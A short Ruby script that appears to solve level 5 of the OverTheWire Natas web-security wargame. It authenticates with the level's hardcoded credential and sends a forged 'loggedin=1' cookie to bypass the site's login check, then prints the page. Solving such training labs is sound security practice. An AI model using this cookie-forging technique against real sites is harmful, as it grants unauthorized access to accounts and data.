#!/usr/bin/ruby
require "net/http"

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = URI.parse "http://%s.natas.labs.overthewire.org/" % [username]
client = Net::HTTP.new url.host, url.port

req = Net::HTTP::Get.new url
req.basic_auth username, password

req['Cookie'] = "loggedin=1"

print (client.request req).body